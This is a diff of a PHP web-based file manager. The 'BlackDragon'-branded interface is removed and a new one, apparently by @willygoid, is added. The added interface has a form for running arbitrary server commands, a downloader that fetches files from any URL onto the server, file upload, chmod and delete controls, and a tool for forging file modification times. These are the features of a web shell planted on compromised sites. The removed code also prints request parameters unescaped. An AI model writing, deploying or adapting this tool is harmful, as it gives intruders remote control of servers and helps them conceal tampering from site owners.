-                                            <label for="name" class="form-label"><?= $_GET['item'] ?></label>
-                                            <textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control"><?= htmlspecialchars(file_get_contents($path. '/'. $_GET['item'])) ?></textarea>
-                                        </div>
-                                        <button type="submit" class="btn btn-outline-light">Submit</button>
-                                        <button type="button" class="btn btn-outline-light" onclick="jscopy()">Copy</button>
-                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
-                                    </form>
-                                <?php elseif ($action == 'view' && isset($_GET['item'])) : ?>
-                                    <div class="mb-3">
-                                        <label for="name" class="form-label">File Name : <?= $_GET['item'] ?></label>
-                                        <textarea name="newContent" rows="10" class="form-control" disabled=""><?= htmlspecialchars(file_get_contents($path. '/'. $_GET['item'])) ?></textarea>
-                                        <br>
-                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
-                                    </div>
-                                <?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>
-                                    <form action="" method="post">
-                                        <div class="mb-3">
-                                            <label for="name" class="form-label"><?= $_GET['item'] ?></label>
-                                            <input type="text" class="form-control" name="newPerm" value="<?= substr(sprintf('%o', fileperms($_GET['item'])), -4); ?>">
-                                        </div>
-                                        <button type="submit" class="btn btn-outline-light">Submit</button>
-                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
-                                    </form>
-                                <?php endif; ?>
-                            </div>
-                        <?php endif; ?>
-                        <div class="row justify-content-center">
-                            <div class="collapse" id="newFolderCollapse" data-bs-parent="#tools" style="transition:none;">
-                                <form action="" method="post">
-                                    <div class="mb-3">
-                                        <label for="name" class="form-label">Folder Name</label>
-                                        <input type="text" class="form-control" name="newFolderName" placeholder="BlackDragon">
-                                    </div>
-                                    <button type="submit" class="btn btn-outline-light">Submit</button>
-                                </form>
-                            </div>
-                            <div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
-                                <form action="" method="post">
-                                    <div class="mb-3">
-                                        <label for="name" class="form-label">File Name</label>
-                                        <input type="text" class="form-control" name="newFileName" placeholder="blackdragon.php">
-                                    </div>
-                                    <div class="mb-3">
-                                        <label for="name" class="form-label">File Content</label>
-                                        <textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World - BlackDragon"></textarea>
-                                    </div>
-                                    <button type="submit" class="btn btn-outline-light">Submit</button>
-                                </form>
-                            </div>
-                        </div> 
-                    </div>
-                    <div class="table-responsive">
-                        <table class="table table-hover table-dark text-light">
-                            <thead>
-                                <tr>
-                                    <td style="width:35%">Name</td>
-                                    <td style="width:10%">Type</td>
-                                    <td style="width:10%">Size</td>
-                                    <td style="width:13%">Owner/Group</td>
-                                    <td style="width:10%">Permission</td>
-                                    <td style="width:13%">Last Modified</td>
-                                    <td style="width:9%">Actions</td>
-                                </tr>
-                            </thead>
-                            <tbody class="text-nowrap">
-                                <?php
-                                    foreach ($dirs as $dir) :
-                                    if (!is_dir($dir)) continue;
-                                ?>
-                                <tr>
-                                    <td>
-                                        <?php if ($dir === '..') : ?>
-                                            <a href="?dir=<?= dirname($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
-                                        <?php elseif ($dir === '.') :  ?>
-                                            <a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
-                                        <?php else : ?>
-                                            <a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
-                                        <?php endif; ?>
-                                    </td>
-                                    <td class="text-light"><?= filetype($dir) ?></td>
-                                    <td class="text-light">-</td>
-                                    <td class="text-light"><?= getOwner($dir) ?></td>
-                                    <td class="text-light">
-                                        <?php
-                                            if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
-                                            elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
-                                            echo perms($path.'/'.$dir);
-                                            if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
-                                        ?>
-                                    </td>
-                                    <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
-                                    <td>
-                                        <?php if ($dir != '.' && $dir != '..') : ?>
-                                            <div class="btn-group">
-                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
-                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
-                                                <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
-                                            </div>
-                                        <?php elseif ($dir === '.') : ?>
-                                        <div class="btn-group">
-                                            <a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-folder-plus"></i></a>
-                                            <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-plus"></i></a>
-                                        </div>
-                                        <?php endif; ?>
-                                    </td>
-                                </tr>
-                                <?php endforeach; ?>
-                                    <?php
-                                        foreach ($dirs as $dir) :
-                                        if (!is_file($dir)) continue;
-                                    ?>
-                                    <tr>
-                                        <td>
-                                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=view" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
-                                        </td>
-                                        <td class="text-light"><?= (function_exists('mime_content_type') ? mime_content_type($dir) : filetype($dir)) ?></td>
-                                        <td class="text-light"><?= fsize($dir) ?></td>
-                                        <td class="text-light"><?= getOwner($dir) ?></td>
-                                        <td class="text-light">
-                                            <?php
-                                                if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
-                                                elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
-                                                echo perms($path.'/'.$dir);
-                                                if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
-                                            ?>
-                                        </td>
-                                        <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
-                                        <td>
-                                            <?php if ($dir != '.' && $dir != '..') : ?>
-                                                <div class="btn-group">
-                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-edit"></i></a>
-                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
-                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
-                                                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
-                                                </div>
-                                            <?php endif; ?>
-                                        </td>
-                                    </tr>
-                                <?php endforeach; ?>
-                            </tbody>
-                        </table>
-                    </div>
-                    <div class="text-light">&#169; BlackDragon <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
-                </div>
-            </div>
+<?php elseif($action=='command'): ?>
+    <div class="container mx-auto p-4 bg-white rounded-lg shadow">
+    <h2 class="text-xl font-bold mb-2">💡 Execute Command</h2>
+    <form method="post" onsubmit="$.post('?action=command',$ (this).serialize(),function(d){$('#output').html(d);});return false;">
+    <input name="cmd" class="border w-full px-2 py-1 mb-2" placeholder="Enter command...">
+    <button class="bg-green-500 text-white px-3 py-1 rounded">Run</button>
+    </form>
+    <div id="output" class="mt-2 text-sm"></div>
+    </div>
+
+<?php else: ?>
+
+<div class="container mx-auto p-4 bg-white rounded-lg shadow">
+    <div class="flex justify-between mb-4">
+    <div class="flex space-x-2">
+    <a href="?path=<?=urlencode($docroot)?>" class="bg-gray-300 px-2 py-1 rounded">🏠 Root</a>
+    <a href="?path=<?=urlencode($self_dir)?>" class="bg-gray-300 px-2 py-1 rounded">📂 FM Dir</a>
+    </div>    
+    <div class="flex space-x-2">
+    <form method="get" class="flex space-x-1 mb-2 md:mb-0"><input type="hidden" name="path" value="<?=htmlspecialchars($path)?>"><input type="text" name="search" value="<?=htmlspecialchars($search)?>" placeholder="Search..." class="border px-2 py-1 rounded w-32"><button class="bg-gray-300 px-2 rounded">🔍</button></form>
+    <button id="showDownloader" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
+        </svg>
+        <span>Down</span>
+    </button>
+    <button id="showNewFolder" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 10.5v6m3-3H9m4.06-7.19-2.12-2.12a1.5 1.5 0 0 0-1.061-.44H4.5A2.25 2.25 0 0 0 2.25 6v12a2.25 2.25 0 0 0 2.25 2.25h15A2.25 2.25 0 0 0 21.75 18V9a2.25 2.25 0 0 0-2.25-2.25h-5.379a1.5 1.5 0 0 1-1.06-.44Z" />
+        </svg>
+        <span>ND</span>
+    </button>
+    <button id="showNewFile" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m3.75 9v6m3-3H9m1.5-12H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
+        </svg>
+        <span>NF</span>
+    </button>
+    <form method="post" enctype="multipart/form-data" id="uploadForm" class="inline">
+    <input type="file" name="files[]" multiple id="uploadInput" class="hidden">
+    <button type="button" id="uploadBtn" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 16.5V9.75m0 0 3 3m-3-3-3 3M6.75 19.5a4.5 4.5 0 0 1-1.41-8.775 5.25 5.25 0 0 1 10.233-2.33 3 3 0 0 1 3.758 3.848A3.752 3.752 0 0 1 18 19.5H6.75Z" />
+        </svg>
+        <span>Upload</span>
+    </button>
+    </form>
+    </div></div>
+
+    <table class="min-w-full bg-white border">
+    <tr class="bg-gray-200">
+    <th class="p-2 text-left"><a href="<?=sort_url('name',$sort,$order,$path,$search)?>" class="hover:underline">Name<?=($sort=='name'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
+    <th class="p-2">Owner</th>
+    <th class="p-2">Perm</th>
+    <th class="p-2"><a href="<?=sort_url('mtime',$sort,$order,$path,$search)?>" class="hover:underline">Last Modified<?=($sort=='mtime'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
+    <th class="p-2">Action</th></tr>
+    <?php if($path != $parent): ?><tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700"><td class="p-2"><a href="?path=<?=urlencode($parent)?>" class="text-blue-500">📁 ..</a></td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td></tr><?php endif; ?>
+    <?php foreach(array_merge($folders,$regular_files) as $f):$fp=$path.'/'.$f['name'];$mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
+    <tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700">
+    <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
+    <td class="p-2"><?=htmlspecialchars($f['owner'])?></td>
+    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-perm="<?=htmlspecialchars($f['perm'])?>" class="perm-btn underline px-2 py-1 rounded <?=is_writable($fp)?'bg-green-200 text-green-800':'bg-red-200 text-red-800'?>"><?=$f['perm']?></button></td>
+    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
+    <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-gray-300 px-2 rounded" title="Edit">📝</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-gray-300 px-2 rounded" title="Rename">✍🏼</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-gray-300 px-2 rounded" title="Delete">🗑️</button></td></tr><?php endforeach;?>
+    </table>
+</div>
+
+<!-- Modals -->
+<div id="editModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
+<div class="bg-white p-4 w-1/2 rounded">
+<h2 class="text-xl mb-2">✏️ Edit: <span class="edit-filename text-blue-600"></span></h2>
+<form method="post"><input type="hidden" name="edit_file">
+<textarea name="content" class="w-full h-96 border mb-2 font-mono"></textarea>
+<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">💾 Save</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Close</button></div>
+</form></div></div>
+
+<div id="deleteModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
+<div class="bg-white p-4 rounded">
+<form method="post"><p>Delete <span class="font-bold"></span> ?</p><input type="hidden" name="delete">
+<div class="flex justify-between mt-2"><button class="bg-red-500 text-white px-4 py-1 rounded">🗑️ Delete</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
+
+<div id="renameModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
+<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="rename_from">
+<p>New name:</p><input name="rename_to" class="border px-2 mb-2">
+<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">↩️ Rename</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
+
+<div id="newFileModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
+<div class="bg-white p-4 rounded"><form method="post"><p>File name:</p><input name="new_file" class="border px-2 mb-2">
+<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">📄 Create</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
+
+<div id="newFolderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
+<div class="bg-white p-4 rounded"><form method="post"><p>Folder name:</p><input name="new_folder" class="border px-2 mb-2">
+<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">📁 Create</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
+
+<div id="mtimeModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
+<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="update_mtime">
+<p>Edit Last Modified of <span class="font-bold"></span>:</p>
+<input type="datetime-local" name="mtime_value" class="border px-2 mb-2">
+<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">⏰ Update</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
+
+<div id="downloaderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
+<div class="bg-white p-4 rounded"><form method="post"><p>URL Source:</p><input name="download_url" class="border px-2 mb-2 w-full"><p>Output Name:</p><input name="output_name" class="border px-2 mb-2 w-full"><p>Method:</p><select name="method" class="border px-2 mb-2 w-full"><option>file_get_contents</option><option>cURL</option><option>fopen</option><option>copy</option><option>stream_context</option></select>
+<div class="flex justify-between"><button class="bg-purple-500 text-white px-4 py-1 rounded">⬇️ Download</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
+
+<div id="permModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
+<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="update_perm">
+<p>Edit Permission of <span class="font-bold"></span>:</p>
+<input name="perm_value" class="border px-2 mb-2" placeholder="e.g. 755">
+<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">🔧 Update</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
+
+<?php if(isset($_SESSION['msg'])): ?>
+<script>
+toastr.options = { "closeButton": true, "progressBar": true, "positionClass":"toast-top-right"};
+toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($_SESSION['msg']) ?>");
+</script>
+<?php unset($_SESSION['msg'],$_SESSION['msg_type']); endif; ?>
+
+<?php endif;?>
+
+<footer class="container mx-auto p-4">
+      <div class="flex flex-col sm:flex-row justify-between items-center pt-4 border-t border-gray-300">
+        <div class="flex-grow lg:w-1/2 text-gray-600">
+              <?=date('Y');?> - <a href="https://www.github.com/willygoid" target="_blank" class="text-blue-700 hover:text-blue-500">@willygoid</a></div>
+        <div class="flex-grow lg:w-1/2 text-gray-600 text-right">
+          <p class="font-bold"> <button type="button" id="toggleTheme" class="bg-gray-800 text-white px-2 py-1 rounded">🌙 Dark</button> v<?=APP_VER;?></p>
         </div>
-        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
-        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
-        <script>
-            <?php if (isset($_SESSION['message'])) : ?>
-                Swal.fire(
-                '<?= $_SESSION['status'] ?>',
-                '<?= $_SESSION['message'] ?>',
-                '<?= $_SESSION['class'] ?>'
-                )
-            <?php endif; clear(); ?>
-            function deleteConfirm(url) {
-            event.preventDefault()
-            Swal.fire({
-                title: 'Are you sure?',
-                icon: 'warning',
-                showCancelButton: true,
-                confirmButtonColor: '#3085d6',
-                cancelButtonColor: '#d33',
-                confirmButtonText: 'Yes, delete it!'
-            }).then((result) => {
-                if (result.isConfirmed) {
-                        window.location.href = url
-                    }
-                })
-            }
-            function jscopy() {
-                var jsCopy = document.getElementById("CopyFromTextArea");
-                jsCopy.focus();
-                jsCopy.select();
-                document.execCommand("copy");
-            }
-        </script>
-    </body>
-</html>
+      </div>
+</footer>
+<script>
+$(function(){
+  $('#toggleTheme').click(function(){
+    $('body').toggleClass('dark bg-gray-900 text-gray-100');
+    // Toggle tombol text
+    if($('body').hasClass('dark')){
+      $(this).text('☀️ Light').removeClass('bg-gray-800').addClass('bg-yellow-500');
+    } else {
+      $(this).text('🌙 Dark').removeClass('bg-yellow-500').addClass('bg-gray-800');
+    }
+    // Simpan preferensi ke localStorage
+    if($('body').hasClass('dark')) localStorage.setItem('theme','dark');
+    else localStorage.setItem('theme','light');
+  });
+
+  // Cek preferensi theme saat load
+  if(localStorage.getItem('theme')==='dark'){
+    $('body').addClass('dark bg-gray-900 text-gray-100');
+    $('#toggleTheme').text('☀️ Light').removeClass('bg-gray-800').addClass('bg-yellow-500');
+  }
+});
+</script>
+</body></html>
